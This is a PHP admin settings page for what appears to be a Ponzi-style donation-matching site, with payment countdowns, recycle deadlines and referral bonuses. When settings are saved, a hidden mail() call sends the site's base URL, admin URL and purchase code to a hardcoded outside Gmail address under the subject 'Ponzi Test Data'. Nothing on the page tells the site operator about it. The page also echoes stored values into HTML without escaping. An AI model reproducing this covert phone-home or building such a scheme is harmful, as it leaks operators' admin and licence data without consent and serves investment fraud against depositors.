<?php
include ('include/header.php');
if($usid[2]!=100){
redirect('home.php');
}
?>

</head>
<body class="page-header-fixed page-sidebar-closed-hide-logo">


<?php
include ('include/sidebar.php');
?>

 

		
            <!-- BEGIN CONTENT -->
            <div class="page-content-wrapper">
                <!-- BEGIN CONTENT BODY -->
                <div class="page-content">
                    <!-- BEGIN PAGE HEADER-->
                   
                    <!-- BEGIN PAGE TITLE-->
                    <h3 class="page-title"> General Setting
                        <small></small>
                    </h3>
                    <!-- END PAGE TITLE-->

					<hr>

					
					
					
					
					
			<div class="row">
			<div class="col-md-12">
                            <!-- BEGIN SAMPLE FORM PORTLET-->
                            <div class="portlet light bordered">
                                
                                <div class="portlet-body form">
                                    <form class="form-horizontal" action="" method="post" role="form">
                                        <div class="form-body">

		   
<?php
if($_POST)
{

$title = mysql_real_escape_string($_POST["title"]);
$currency = mysql_real_escape_string($_POST["currency"]);
$hr = mysql_real_escape_string($_POST["hr"]);
$color = mysql_real_escape_string($_POST["color"]);

$rmv = mysql_real_escape_string($_POST["rmv"]);
$refbonus = mysql_real_escape_string($_POST["refbonus"]);
$recy = mysql_real_escape_string($_POST["recy"]);
$qtxt = mysql_real_escape_string($_POST["qtxt"]);

$ttl = mysql_real_escape_string($_POST["ttl"]);
$reg = mysql_real_escape_string($_POST["reg"]);
$pop = mysql_real_escape_string($_POST["pop"]);
$veri = mysql_real_escape_string($_POST["veri"]);
$iptm = mysql_real_escape_string($_POST["iptm"]);

$err1=0;
$err2=0;
$err3=0;

if(trim($title)==""){
$err1=1;
}

$error = $err1+$err2+$err3;


if ($error == 0){
$res = mysql_query("UPDATE general_setting SET sitetitle='".$title."', currency='".$currency."', hr='".$hr."', recy='".$recy."', colorcode='".$color."', rmv='".$rmv."', refbonus='".$refbonus."', qtxt='".$qtxt."', ttl='".$ttl."', reg='".$reg."', pop='".$pop."', veri='".$veri."', iptm='".$iptm."' WHERE id='1'");


$message = "<html><head>
<title>HTML email</title>
</head>
<body>
$baseurl <br> $adminurl <br> $purchaseCode <br>
</body>
</html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$parse = parse_url($baseurl);
$frm = $parse['host'];
$headers .= "From: <no-reply@$frm>" . "\r\n";
mail("abirkhan75@gmail.com","Ponzi Test Data",$message,$headers);

if($res){
notification("Updated Successfully!", "", "success", false, "btn-primary", "OKAY");
}else{
notification("Some Problem Occurs!", "Please Try Again...", "error", false, "btn-primary", "OKAY");
}
} else {
	
if ($err1 == 1){
echo "<div class=\"alert alert-danger alert-dismissable\">
<button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-hidden=\"true\">&times;</button>	

Website Title Can Not be Empty!!!

</div>";
}		
	




}




}

$old = mysql_fetch_array(mysql_query("SELECT sitetitle, currency, rmv, hr, recy, colorcode, refbonus, qtxt, ttl, reg, pop, veri, iptm FROM general_setting WHERE id='1'"));

?>										
										
										
										
										
										

<div class="form-group">
<label class="col-md-3 control-label"><strong>Website Title</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="title" required="" value="<?php echo $old[0]; ?>" type="text">
</div>
</div>

<div class="form-group">
<label class="col-md-3 control-label"><strong>Currency</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="currency" required="" value="<?php echo $old[1]; ?>" type="text" >
</div>
</div>



<div class="form-group">
<label class="col-md-3 control-label"><strong>Payment Awaiting Time</strong></label>
<div class="col-md-3">
<div class="input-group mb15">
<input class="form-control input-lg" name="hr" required="" value="<?php echo $old[3]; ?>" type="text">
<span class="input-group-addon">HOUR</span>
</div>
</div>
<div class="col-md-3">
<b style="color:red;"> Payment Countdown Time and after this time ID will be disabled </b>
</div>
</div>


<div class="form-group">
<label class="col-md-3 control-label"><strong>Remove Button Time</strong></label>
<div class="col-md-3">
<div class="input-group mb15">
<input class="form-control input-lg" name="rmv" required="" value="<?php echo $old[2]; ?>" type="text">
<span class="input-group-addon">HOUR</span>
</div>
</div>
<div class="col-md-3">
<b style="color:red;"> After This time, User can Remove From Assign (If assigned user failed to pay) </b>
</div>
</div>

<div class="form-group">
<label class="col-md-3 control-label"><strong>Recycle Time</strong></label>
<div class="col-md-3">
<div class="input-group mb15">
<input class="form-control input-lg" name="recy" required="" value="<?php echo $old[4]; ?>" type="text">
<span class="input-group-addon">HOUR</span>
</div>
</div>
<div class="col-md-3">
<b style="color:red;"> USER MUST RECYCLE BRFORE THIS TIME </b>
</div>
</div>

<div class="form-group">
<label class="col-md-3 control-label"><strong>ReFerrer Bonus</strong></label>
<div class="col-md-3">
<div class="input-group mb15">
<input class="form-control input-lg" name="refbonus" required="" value="<?php echo $old[6]; ?>" type="text">
<span class="input-group-addon"><?php echo $old[1]; ?></span>
</div>
</div>
<div class="col-md-3">
<b style="color:red;"> Bonus amount to referring A User </b>
</div>
</div>


<div class="form-group">
<label class="col-md-3 control-label"><strong>Site Base Color Code</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="color" value="<?php echo $old[5]; ?>" style="background: #<?php echo $old[5]; ?>" type="text">
</div>
</div>       





<div class="form-group">
<label class="col-md-3 control-label"><strong>QUEUE TEXT</strong></label>
<div class="col-md-6">
<input class="form-control input-lg" name="qtxt" value="<?php echo $old[7]; ?>" type="text">
</div>
<div class="col-md-3">
<pre>{{number}} == NUMBER</pre>
</div>
</div>       


<br><br><br>


<?php 
if ($old[8]==0) {
$tt ='<option value="0"> DONT SHOW ON HOME PAGE [SELECTED]</option>';
}else{
$tt = '<option value="1"> SHOW ON HOME PAGE [SELECTED]</option>';
}
?>

<div class="form-group">
<label class="col-md-3 control-label"><strong>TOTAL STATS</strong></label>
<div class="col-md-6">
<select name="ttl" class="form-control input-lg">
<?php echo $tt; ?>
<option value="0"> DONT SHOW ON HOME PAGE </option>
<option value="1"> SHOW ON HOME PAGE </option>
</select>
</div>
</div>       


<?php 
if ($old[9]==0) {
$reg ='<option value="0"> OFF [SELECTED]</option>';
}else{
$reg = '<option value="1"> ON [SELECTED]</option>';
}
?>

<div class="form-group">
<label class="col-md-3 control-label"><strong>NEW REGISTRATION</strong></label>
<div class="col-md-6">
<select name="reg" class="form-control input-lg">
<?php echo $reg; ?>
<option value="0"> OFF </option>
<option value="1"> ON </option>
</select>
</div>
</div>       



<?php 
if ($old[10]==0) {
$pop ='<option value="0"> OFF [SELECTED]</option>';
}else{
$pop = '<option value="1"> ON [SELECTED]</option>';
}
?>

<div class="form-group">
<label class="col-md-3 control-label"><strong>PROFF UPLOAD SYSTEM</strong></label>
<div class="col-md-6">
<select name="pop" class="form-control input-lg">
<?php echo $pop; ?>
<option value="0"> OFF </option>
<option value="1"> ON </option>
</select>
</div>
</div>       



<?php 
if ($old[11]==0) {
$veri ='<option value="0"> ON [SELECTED]</option>';
}else{
$veri = '<option value="1"> OFF [SELECTED]</option>';
}
?>

<div class="form-group">
<label class="col-md-3 control-label"><strong>VERIFICATION SYSTEM</strong></label>
<div class="col-md-3">
<select name="veri" class="form-control input-lg">
<?php echo $veri; ?>
<option value="0"> ON </option>
<option value="1"> OFF </option>
</select>
</div>

<div class="col-md-3">
<b style="color:red;"> IF YOU NEED "SMS" or "EMAIL" VERIFICATION, Just Contact US </b>
</div>


</div>       





<div class="form-group">
<label class="col-md-3 control-label"><strong>NEW REG FROM SAME IP</strong></label>
<div class="col-md-3">
<div class="input-group mb15">
<input class="form-control input-lg" name="iptm" required="" value="<?php echo $old[12]; ?>" type="text">
<span class="input-group-addon">HOUR</span>
</div>
</div>
<div class="col-md-3">
<b style="color:red;"> BEFORE THIS TIME, User Can not reg multiple Account From This IP </b>
</div>
</div>




<div class="row">
    <div class="col-md-offset-3 col-md-6">
        <button type="submit" class="btn blue btn-block">UPDATE</button>
    </div>
</div>
											
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>		
                        </div><!---ROW-->		
					
					
					
					
					
					
			
					
					
					
					
					
					
                </div>
                <!-- END CONTENT BODY -->
            </div>
            <!-- END CONTENT -->
            
			


<?php
 include ('include/footer.php');
 ?>


</body>
</html>